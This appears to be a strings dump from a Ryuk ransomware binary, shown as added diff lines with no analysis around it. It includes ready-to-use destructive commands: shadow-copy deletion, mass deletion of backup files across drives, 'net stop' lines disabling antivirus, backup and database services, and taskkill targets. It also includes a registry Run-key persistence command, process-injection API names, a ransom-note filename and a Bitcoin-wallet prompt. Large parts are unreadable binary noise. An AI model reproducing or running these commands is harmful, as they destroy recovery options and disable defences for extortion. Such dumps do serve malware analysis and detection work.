+vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded
+vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB
+vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded
+vssadmin Delete Shadows /all /quiet
+del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
+del /s /f /q d:\*.VHD d:\*.bac d:\*.bak d:\*.wbcat d:\*.bkf d:\Backup*.* d:\backup*.* d:\*.set d:\*.win d:\*.dsk
+del /s /f /q e:\*.VHD e:\*.bac e:\*.bak e:\*.wbcat e:\*.bkf e:\Backup*.* e:\backup*.* e:\*.set e:\*.win e:\*.dsk
+del /s /f /q f:\*.VHD f:\*.bac f:\*.bak f:\*.wbcat f:\*.bkf f:\Backup*.* f:\backup*.* f:\*.set f:\*.win f:\*.dsk
+del /s /f /q g:\*.VHD g:\*.bac g:\*.bak g:\*.wbcat g:\*.bkf g:\Backup*.* g:\backup*.* g:\*.set g:\*.win g:\*.dsk
+del /s /f /q h:\*.VHD h:\*.bac h:\*.bak h:\*.wbcat h:\*.bkf h:\Backup*.* h:\backup*.* h:\*.set h:\*.win h:\*.dsk
+del %0
+kernel32.dll
+IsWow64Process
+iqkZsdgHinxGGBvFmNpmoSLAqENMcGqmniHObRwwXfiMWVDJCmYKByrUwyKSMnJFjRwLKYnzrNkFjhWscRP
+dNhQzfRKcUwcXxSGfsvZKXlGTGQqZhmViyKAfpRiituTRpLhjUsjoNvbixhehKRIEarSkKhtDJJOSidgLecKydihTYJLimypuSklidnKLAFlOScBmBdtSVcAurVBhtIqPhCcTbjpwVZfCfqYPWaNfavnAhZeEUjgrCudoPDCYbBtkttWAKYZtbrRdzRdcwfdTSDuOWDmfqfgOUNYTkXmUliTFBPUDBNPgZdUbiLrTxcfzxUKyXNWEbLXwkvgltmHtkyoDrtYWHoCMHMkaAFPjGxEzszhOBeRwjxwzSfEZCNpRKzoNPJtwKMbrjpmjbogyzTbKwupLBnyXgtsUXiPNGORdMNRzeEhAmPSMawcZsuRsQwTqiDSHHoaiWfsdXKmgNclsATJtLCGPaPjfrjVbHDmQHIJhxxHFiyQLpyFzqXaELRxRdNuxPpYBlnaHkuFLBLBUhkosPrQZUuTMkSAFNmqVFlOMPqxqvzsBkahIXEMinIXoSCoiVVLakaXuVDHHRQbibrHuZxPQCkihrpzcSyhPDeecOyJtWmkjhfqMIorhsLfxXRrmNabsbXcQRrrkhBwIfSRTnKXDtjrAKZwJMaeHqnYKpugmqSMMpNimlgjiTForiJZjUQLoaUhmLpXVmYRsgZGOgepClcHFzmRBHZHiDTKUFBtqzcHqbfCfoIrBTZeSufxEleUNBmWJVUqIBNvtZnbGGhjITbigTNODQumzJprnIVVdNoVXdfIDWSgRbDUlrFSlKuaBvBygEWRYNbPdTpXdfKKJyCbdXisGuvXiadHcyEmRsPVwROBAzJlMEKuAqeThmvJuXzUOIdWYaiqkGLlreHCpMSBkXBfyPCUfGGDiDKEhzCFTkMvbSzRfkfLGOVDoSeNBixzQerJDMnRbktbPzcyfkqvyDesWkBnGUnstpAPQYFDhDtQdlzTLWBhQRKzkUoxndTEProrWtmfaGHPMqqqqmGqOChfuKPNBYmrWzajykJokKSUSsAkMpbcSegnTQxecqdUsVxr
+InvokeMainViaCRT
+"Main Invoked."
+FileName
+ExitMainViaCRT
+"Main Returned."
+FileName
+Microsoft.CRTProvider
+.text$mn
+.idata$5
+.00cfg
+.CRT$XCA
+.CRT$XCAA
+.CRT$XCZ
+.CRT$XIA
+.CRT$XIAA
+.CRT$XIAC
+.CRT$XIC
+.CRT$XIZ
+.CRT$XPA
+.CRT$XPX
+.CRT$XPXA
+.CRT$XPZ
+.CRT$XTA
+.CRT$XTZ
+.rdata
+.rdata$sxdata
+.rdata$zETW0
+.rdata$zETW1
+.rdata$zETW2
+.rdata$zETW9
+.rdata$zzzdbg
+.rtc$IAA
+.rtc$IZZ
+.rtc$TAA
+.rtc$TZZ
+.xdata$x
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+.gfids$x
+.gfids$y
+WriteProcessMemory
+HeapFree
+SetLastError
+GetCommandLineW
+GetCurrentProcess
+GetModuleFileNameW
+CreateFileW
+GetVersionExW
+GetModuleHandleA
+OpenProcess
+CreateToolhelp32Snapshot
+GetLastError
+Process32NextW
+GetCurrentThread
+LoadLibraryA
+GlobalAlloc
+DeleteFileW
+Process32FirstW
+GlobalFree
+CloseHandle
+HeapAlloc
+GetWindowsDirectoryW
+GetProcAddress
+VirtualAllocEx
+LocalFree
+GetProcessHeap
+FreeLibrary
+CreateRemoteThread
+VirtualFreeEx
+KERNEL32.dll
+GetTokenInformation
+LookupAccountSidW
+OpenThreadToken
+OpenProcessToken
+ImpersonateSelf
+AdjustTokenPrivileges
+LookupPrivilegeValueW
+ADVAPI32.dll
+ShellExecuteW
+CommandLineToArgvW
+SHELL32.dll
+QueryPerformanceCounter
+GetCurrentProcessId
+GetCurrentThreadId
+GetSystemTimeAsFileTime
+InitializeSListHead
+IsDebuggerPresent
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+GetStartupInfoW
+IsProcessorFeaturePresent
+GetModuleHandleW
+TerminateProcess
+RaiseException
+InitializeCriticalSectionAndSpinCount
+TlsAlloc
+TlsGetValue
+TlsSetValue
+TlsFree
+LoadLibraryExW
+RtlUnwind
+EnterCriticalSection
+LeaveCriticalSection
+DeleteCriticalSection
+ExitProcess
+GetModuleHandleExW
+GetStdHandle
+WriteFile
+GetModuleFileNameA
+MultiByteToWideChar
+WideCharToMultiByte
+GetACP
+LCMapStringW
+GetFileType
+FindClose
+FindFirstFileExA
+FindNextFileA
+IsValidCodePage
+GetOEMCP
+GetCPInfo
+GetCommandLineA
+GetEnvironmentStringsW
+FreeEnvironmentStringsW
+SetStdHandle
+GetStringTypeW
+FlushFileBuffers
+GetConsoleCP
+GetConsoleMode
+HeapSize
+HeapReAlloc
+SetFilePointerEx
+WriteConsoleW
+DecodePointer
+SystemFunction036
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+cies\System\
+%x?f`w
+%BxkIs
+stop "Acronis VSS Provider" /y
+stop "Enterprise Client Service" /y
+stop "Sophos Agent" /y
+stop "Sophos AutoUpdate Service" /y
+stop "Sophos Clean Service" /y
+stop "Sophos Device Control Service" /y
+stop "Sophos File Scanner Service" /y
+stop "Sophos Health Service" /y
+stop "Sophos MCS Agent" /y
+stop "Sophos MCS Client" /y
+stop "Sophos Message Router" /y
+stop "Sophos Safestore Service" /y
+stop "Sophos System Protection Service" /y
+stop "Sophos Web Control Service" /y
+stop "SQLsafe Backup Service" /y
+stop "SQLsafe Filter Service" /y
+stop "Symantec System Recovery" /y
+stop "Veeam Backup Catalog Data Service" /y
+stop AcronisAgent /y
+stop AcrSch2Svc /y
+stop Antivirus /y
+stop ARSM /y
+stop BackupExecAgentAccelerator /y
+stop BackupExecAgentBrowser /y
+stop BackupExecDeviceMediaService /y
+stop BackupExecJobEngine /y
+stop BackupExecManagementService /y
+stop BackupExecRPCService /y
+stop BackupExecVSSProvider /y
+stop bedbg /y
+stop DCAgent /y
+stop EPSecurityService /y
+stop EPUpdateService /y
+stop EraserSvc11710 /y
+stop EsgShKernel /y
+stop FA_Scheduler /y
+stop IISAdmin /y
+stop IMAP4Svc /y
+stop macmnsvc /y
+stop masvc /y
+stop MBAMService /y
+stop MBEndpointAgent /y
+stop McAfeeEngineService /y
+stop McAfeeFramework /y
+stop McAfeeFrameworkMcAfeeFramework /y
+stop McShield /y
+stop McTaskManager /y
+stop mfemms /y
+stop mfevtp /y
+stop MMS /y
+stop mozyprobackup /y
+stop MsDtsServer /y
+stop MsDtsServer100 /y
+stop MsDtsServer110 /y
+stop MSExchangeES /y
+stop MSExchangeIS /y
+stop MSExchangeMGMT /y
+stop MSExchangeMTA /y
+stop MSExchangeSA /y
+stop MSExchangeSRS /y
+stop MSOLAP$SQL_2008 /y
+stop MSOLAP$SYSTEM_BGC /y
+stop MSOLAP$TPS /y
+stop MSOLAP$TPSAMA /y
+stop MSSQL$BKUPEXEC /y
+stop MSSQL$ECWDB2 /y
+stop MSSQL$PRACTICEMGT /y
+stop MSSQL$PRACTTICEBGC /y
+stop MSSQL$PROFXENGAGEMENT /y
+stop MSSQL$SBSMONITORING /y
+stop MSSQL$SHAREPOINT /y
+stop MSSQL$SQL_2008 /y
+stop MSSQL$SYSTEM_BGC /y
+stop MSSQL$TPS /y
+stop MSSQL$TPSAMA /y
+stop MSSQL$VEEAMSQL2008R2 /y
+stop MSSQL$VEEAMSQL2012 /y
+stop MSSQLFDLauncher /y
+stop MSSQLFDLauncher$PROFXENGAGEMENT /y
+stop MSSQLFDLauncher$SBSMONITORING /y
+stop MSSQLFDLauncher$SHAREPOINT /y
+stop MSSQLFDLauncher$SQL_2008 /y
+stop MSSQLFDLauncher$SYSTEM_BGC /y
+stop MSSQLFDLauncher$TPS /y
+stop MSSQLFDLauncher$TPSAMA /y
+stop MSSQLSERVER /y
+stop MSSQLServerADHelper100 /y
+stop MSSQLServerOLAPService /y
+stop MySQL80 /y
+stop MySQL57 /y
+stop ntrtscan /y
+stop OracleClientCache80 /y
+stop PDVFSService /y
+stop POP3Svc /y
+stop ReportServer /y
+stop ReportServer$SQL_2008 /y
+stop ReportServer$SYSTEM_BGC /y
+stop ReportServer$TPS /y
+stop ReportServer$TPSAMA /y
+stop RESvc /y
+stop sacsvr /y
+stop SamSs /y
+stop SAVAdminService /y
+stop SAVService /y
+stop SDRSVC /y
+stop SepMasterService /y
+stop ShMonitor /y
+stop Smcinst /y
+stop SmcService /y
+stop SMTPSvc /y
+stop SNAC /y
+stop SntpService /y
+stop sophossps /y
+stop SQLAgent$BKUPEXEC /y
+stop SQLAgent$ECWDB2 /y
+stop SQLAgent$PRACTTICEBGC /y
+stop SQLAgent$PRACTTICEMGT /y
+stop SQLAgent$PROFXENGAGEMENT /y
+stop SQLAgent$SBSMONITORING /y
+stop SQLAgent$SHAREPOINT /y
+stop SQLAgent$SQL_2008 /y
+stop SQLAgent$SYSTEM_BGC /y
+stop SQLAgent$TPS /y
+stop SQLAgent$TPSAMA /y
+stop SQLAgent$VEEAMSQL2008R2 /y
+stop SQLAgent$VEEAMSQL2012 /y
+stop SQLBrowser /y
+stop SQLSafeOLRService /y
+stop SQLSERVERAGENT /y
+stop SQLTELEMETRY /y
+stop SQLTELEMETRY$ECWDB2 /y
+stop SQLWriter /y
+stop SstpSvc /y
+stop svcGenericHost /y
+stop swi_filter /y
+stop swi_service /y
+stop swi_update_64 /y
+stop TmCCSF /y
+stop tmlisten /y
+stop TrueKey /y
+stop TrueKeyScheduler /y
+stop TrueKeyServiceHelper /y
+stop UI0Detect /y
+stop VeeamBackupSvc /y
+stop VeeamBrokerSvc /y
+stop VeeamCatalogSvc /y
+stop VeeamCloudSvc /y
+stop VeeamDeploymentService /y
+stop VeeamDeploySvc /y
+stop VeeamEnterpriseManagerSvc /y
+stop VeeamMountSvc /y
+stop VeeamNFSSvc /y
+stop VeeamRESTSvc /y
+stop VeeamTransportSvc /y
+stop W3Svc /y
+stop wbengine /y
+stop WRSVC /y
+stop MSSQL$VEEAMSQL2008R2 /y
+stop SQLAgent$VEEAMSQL2008R2 /y
+stop VeeamHvIntegrationSvc /y
+stop swi_update /y
+stop SQLAgent$CXDB /y
+stop SQLAgent$CITRIX_METAFRAME /y
+stop "SQL Backups" /y
+stop MSSQL$PROD /y
+stop "Zoolz 2 Service" /y
+stop MSSQLServerADHelper /y 
+stop SQLAgent$PROD /y 
+stop msftesql$PROD /y 
+stop NetMsmqActivator /y
+stop EhttpSrv /y
+stop ekrn /y
+stop ESHASRV /y
+stop MSSQL$SOPHOS /y
+stop SQLAgent$SOPHOS /y
+stop AVP /y
+stop klnagent /y
+stop MSSQL$SQLEXPRESS /y
+stop SQLAgent$SQLEXPRESS /y
+stop wbengine /y
+stop kavfsslp /y
+stop KAVFSGT /y
+stop KAVFS /y
+stop mfefire /y
+55>_e0??
+55>_e&3:
+=&( 4
+%%?'"4
+6,ZcL>%
+%XQRR@
+BTC wallet:
+2GtALl1>
+6!j'2
+G,:>01
+t4'=:2'*|G)
+!'C\BD@,7X
+;X}P?+
+?l )b1
+Q5> ?S6
+=U0-$-!
+oc&=h;
+a$<W>%
+?(>^Cc`f3
+M'1h;<i
+d4?!A-z
+j)86G2' |
+%BxkIt6
+%BxkIt2
+d4?!A-z
+j)82@)2!}
+D:poY*H
+No system is safe
+/IM zoolz.exe /F
+/IM agntsvc.exe /F
+/IM dbeng50.exe /F
+/IM dbsnmp.exe /F
+/IM encsvc.exe /F
+/IM excel.exe /F
+/IM firefoxconfig.exe /F
+/IM infopath.exe /F
+/IM isqlplussvc.exe /F
+/IM msaccess.exe /F
+/IM msftesql.exe /F
+/IM mspub.exe /F
+/IM mydesktopqos.exe /F
+/IM mydesktopservice.exe /F
+/IM mysqld.exe /F
+/IM mysqld-nt.exe /F
+/IM mysqld-opt.exe /F
+/IM ocautoupds.exe /F
+/IM ocomm.exe /F
+/IM ocssd.exe /F
+/IM onenote.exe /F
+/IM oracle.exe /F
+/IM outlook.exe /F
+/IM powerpnt.exe /F
+/IM sqbcoreservice.exe /F
+/IM sqlagent.exe /F
+/IM sqlbrowser.exe /F
+/IM sqlservr.exe /F
+/IM sqlwriter.exe /F
+/IM steam.exe /F
+/IM synctime.exe /F
+/IM tbirdconfig.exe /F
+/IM thebat.exe /F
+/IM thebat64.exe /F
+/IM thunderbird.exe /F
+/IM visio.exe /F
+/IM winword.exe /F
+/IM wordpad.exe /F
+/IM xfssvccon.exe /F
+/IM tmlisten.exe /F
+/IM PccNTMon.exe /F
+/IM CNTAoSMgr.exe /F
+/IM Ntrtscan.exe /F
+/IM mbamtray.exe /F
+ZUKUx}"K
+g*SqM5'T2Xzf
+5;T5Xzf
+?_>sI~
+5;T4Xzf
+?_?sI~
+g,SqM7(
+g/SqM7(
+ ,TeRk
+#_<sI~
+#_=sI~
+g.SqM5'T6Xzf
+g!SqM5'T9Xzf
+2B9s5{L8(
+%B9s5{L8"
+*cG{B9s5{L),
+6iF"Bu/I~
+B>s5{L8(
+qM<iF B?s5{L
+*cG{B?s53
+!HtcI4X
+=Bu:I~
+?B<s5{L>:
+qM)iF7Bu8I6X
+:B=s5{L-+
+!HtcI6X
+%B=s5{L- 
+2B2s5{L8(
+%B2s5{L8"
+*cG{B2s5{L),
+2-3G3Q3
+4j4v4{4
+62676D6
+758H8[8g8w8
+:(:W:_:w:}:
+;<:<{<
+='=1=N=
+=S>\>d>
+?!?0?:?P?Y?d?k?
+0(080H0X0a0
+0(1N1q1
+2D3l3%484
+6$606>6`6p6u6z6
+6-72777v7{7
+8'8,818a8i8t8
+9):;:E:S:n:
+?8?F?M?U?n?
+304H4u4
+6$6:6P6g6n6z6
+7%777D7V7^7h7q7
+8+949`9i9q9
+<-=?=u=z=
+>%>->8>>>I>O>]>
+?9?g?m?
+4"4O4V4
+5#5=5F5S5]5
+7.8@8p8
+949g9z9
+?%?6?;?P?
+3!3,3C3s3
+7,7R7t7
+8/878s8
+9-9?9J9O9T9o9y9
+:%:A:L:Q:V:t:~:
+<&<+<0<R<`<o<
+> ><>C>Z>p>
+1H1Z1l1~1
+2 2A2S2e2w2
+9!9E9y9
+:!:E:`:k:
+:=;D;K;R;_;
+<"=+=C=U=
+3 4;4H4V4d4o4
+2)202F2\2i2n2|2
+353J3[3
+374S4r4
+?0(171V1n1
+3*323O3_3k3z3~4
+4(5E5Y5d5
+7K8L9\9m9u9
+>E>O>j>
+2<3W3m3
+1&2k2p2t2x2|2
+4D6W6u6
+618h8o8t8x8|8
+9 9$9(9,9
+$1,181<1@1D1H1T1X1\1p1t1x1
+3 3$3(3,3034383<3@3D3H3L3P3T3X3\3`3d3h3l3p3t3x3|3
+4 4$4(4,4044484<4@4D4H4L4P4T4X4\4`4d4h4l4p4t4x4|4
+4@;H;P;T;X;\;`;d;h;l;t;x;|;
+5 5$5(5,5054585<5@5D5H5L5P5T5X5\5`5d5h5l5p5t5x5|5
+6 6$6(6,6064686<6@6D6H6L6P6T6X6\6`6d6h6l6p6t6x6
+7(8,8084888<8@8D8H8L8P8T8X8\8`8d8h8l8p8t8L=T=\=d=l=t=|=
+>$>,>4><>D>L>T>\>d>l>t>|>
+?$?,?4?<?D?L?T?\?d?l?t?|?
+0$0,040<0D0L0T0\0d0l0t0|0
+1$1,141<1D1L1T1\1d1l1t1|1
+2$2,242<2D2L2T2\2d2l2t2|2
+3$3,343<3D3L3T3\3d3l3t3|3
+4$4,444<4D4L4T4\4d4h>p>x>
+? ?(?0?8?@?H?P?X?`?h?p?x?
+0 0(00080@0H0P0X0`0h0p0x0
+1 1(10181@1H1P1X1`1h1p1x1
+2 2(20282@2H2P2X2`2h2p2x2
+3 3(30383@3H3P3X3`3h3p3x3
+4 4(40484@4H4P4X4`4h4p4x4
+5 5(50585@5H5P5X5`5h5p5x5
+9$9,949<9D9L9T9\9d9l9t9|9
+94;8;@;L?P?l?p?
+080X0x0
+181X1x1
+2 2@2`2
+1 1$1@1D1p6
+@advapi32
+api-ms-win-core-fibers-l1-1-1
+api-ms-win-core-synch-l1-2-0
+kernel32
+mscoree.dll
+         (((((                  H
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+@ja-JP
+@api-ms-win-appmodel-runtime-l1-1-1
+api-ms-win-core-datetime-l1-1-1
+api-ms-win-core-file-l2-1-1
+api-ms-win-core-localization-l1-2-1
+api-ms-win-core-localization-obsolete-l1-2-0
+api-ms-win-core-processthreads-l1-1-2
+api-ms-win-core-string-l1-1-0
+api-ms-win-core-sysinfo-l1-2-1
+api-ms-win-core-winrt-l1-1-0
+api-ms-win-core-xstate-l2-1-0
+api-ms-win-rtcore-ntuser-window-l1-1-0
+api-ms-win-security-systemfunctions-l1-1-0
+ext-ms-win-kernel32-package-current-l1-1-0
+ext-ms-win-ntuser-dialogbox-l1-1-0
+ext-ms-win-ntuser-windowstation-l1-1-0
+user32
+zh-CHS
+az-AZ-Latn
+uz-UZ-Latn
+kok-IN
+syr-SY
+div-MV
+quz-BO
+sr-SP-Latn
+az-AZ-Cyrl
+uz-UZ-Cyrl
+quz-EC
+sr-SP-Cyrl
+quz-PE
+smj-NO
+bs-BA-Latn
+smj-SE
+sr-BA-Latn
+sma-NO
+sr-BA-Cyrl
+sma-SE
+sms-FI
+smn-FI
+zh-CHT
+az-az-cyrl
+az-az-latn
+bs-ba-latn
+div-mv
+kok-in
+quz-bo
+quz-ec
+quz-pe
+sma-no
+sma-se
+smj-no
+smj-se
+smn-fi
+sms-fi
+sr-ba-cyrl
+sr-ba-latn
+sr-sp-cyrl
+sr-sp-latn
+syr-sy
+uz-uz-cyrl
+uz-uz-latn
+zh-chs
+zh-cht
+CONOUT$
+\Documents and Settings\Default User\
+\users\Public\
+advapi32
+api-ms-win-core-fibers-l1-1-1
+api-ms-win-core-synch-l1-2-0
+kernel32
+mscoree.dll
+(null)
+api-ms-win-appmodel-runtime-l1-1-1
+api-ms-win-core-datetime-l1-1-1
+api-ms-win-core-file-l2-1-1
+api-ms-win-core-localization-l1-2-1
+api-ms-win-core-localization-obsolete-l1-2-0
+api-ms-win-core-processthreads-l1-1-2
+api-ms-win-core-string-l1-1-0
+api-ms-win-core-sysinfo-l1-2-1
+api-ms-win-core-winrt-l1-1-0
+api-ms-win-core-xstate-l2-1-0
+api-ms-win-rtcore-ntuser-window-l1-1-0
+api-ms-win-security-systemfunctions-l1-1-0
+ext-ms-win-kernel32-package-current-l1-1-0
+ext-ms-win-ntuser-dialogbox-l1-1-0
+ext-ms-win-ntuser-windowstation-l1-1-0
+user32
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+         (((((                  H
+zh-CHS
+az-AZ-Latn
+uz-UZ-Latn
+kok-IN
+syr-SY
+div-MV
+quz-BO
+sr-SP-Latn
+az-AZ-Cyrl
+uz-UZ-Cyrl
+quz-EC
+sr-SP-Cyrl
+quz-PE
+smj-NO
+bs-BA-Latn
+smj-SE
+sr-BA-Latn
+sma-NO
+sr-BA-Cyrl
+sma-SE
+sms-FI
+smn-FI
+zh-CHT
+az-az-cyrl
+az-az-latn
+bs-ba-latn
+div-mv
+kok-in
+quz-bo
+quz-ec
+quz-pe
+sma-no
+sma-se
+smj-no
+smj-se
+smn-fi
+sms-fi
+sr-ba-cyrl
+sr-ba-latn
+sr-sp-cyrl
+sr-sp-latn
+syr-sy
+uz-uz-cyrl
+uz-uz-latn
+zh-chs
+zh-cht
+CONOUT$
+\Documents and Settings\Default User\finish
+\users\Public\finish
+PUBLIC
+UNIQUE_ID_DO_NOT_REMOVE
+SeDebugPrivilege
+csrss.exe
+explorer.exe
+lsaas.exe
+\Documents and Settings\Default User\sys
+\users\Public\sys
+RyukReadMe.txt
+\System32\cmd.exe
+\Documents and Settings\Default User\
+\users\Public\
+/C REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "svchos" /t REG_SZ /d "
+ /reg:64
+q2(&8
+UNIQUE_ID_DO_NOT_REMOVE
+hrmlog
+q2(&8
+?;Iy2(&
+advapi32
+api-ms-win-core-fibers-l1-1-1
+api-ms-win-core-synch-l1-2-0
+kernel32
+mscoree.dll
+(null)
+api-ms-win-appmodel-runtime-l1-1-1
+api-ms-win-core-datetime-l1-1-1
+api-ms-win-core-file-l2-1-1
+api-ms-win-core-localization-l1-2-1
+api-ms-win-core-localization-obsolete-l1-2-0
+api-ms-win-core-processthreads-l1-1-2
+api-ms-win-core-string-l1-1-0
+api-ms-win-core-sysinfo-l1-2-1
+api-ms-win-core-winrt-l1-1-0
+api-ms-win-core-xstate-l2-1-0
+api-ms-win-rtcore-ntuser-window-l1-1-0
+api-ms-win-security-systemfunctions-l1-1-0
+ext-ms-win-kernel32-package-current-l1-1-0
+ext-ms-win-ntuser-dialogbox-l1-1-0
+ext-ms-win-ntuser-windowstation-l1-1-0
+user32
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+         (((((                  H
+zh-CHS
+az-AZ-Latn
+uz-UZ-Latn
+kok-IN
+syr-SY
+div-MV
+quz-BO
+sr-SP-Latn
+az-AZ-Cyrl
+uz-UZ-Cyrl
+quz-EC
+sr-SP-Cyrl
+quz-PE
+smj-NO
+bs-BA-Latn
+smj-SE
+sr-BA-Latn
+sma-NO
+sr-BA-Cyrl
+sma-SE
+sms-FI
+smn-FI
+zh-CHT
+az-az-cyrl
+az-az-latn
+bs-ba-latn
+div-mv
+kok-in
+quz-bo
+quz-ec
+quz-pe
+sma-no
+sma-se
+smj-no
+smj-se
+smn-fi
+sms-fi
+sr-ba-cyrl
+sr-ba-latn
+sr-sp-cyrl
+sr-sp-latn
+syr-sy
+uz-uz-cyrl
+uz-uz-latn
+zh-chs
+zh-cht
+CONOUT$
+\Documents and Settings\Default User\finish
+\users\Public\finish
+PUBLIC
+UNIQUE_ID_DO_NOT_REMOVE
+SeDebugPrivilege
+csrss.exe
+explorer.exe
+lsaas.exe
+\Documents and Settings\Default User\sys
+\users\Public\sys
+RyukReadMe.txt
+\System32\cmd.exe
+\Documents and Settings\Default User\
+\users\Public\
+/C REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "svchos" /t REG_SZ /d "
+ /reg:64
+UNIQUE_ID_DO_NOT_REMOVE
+q2(&8
+hrmlog
+q2(&8
+?;Iy2(&
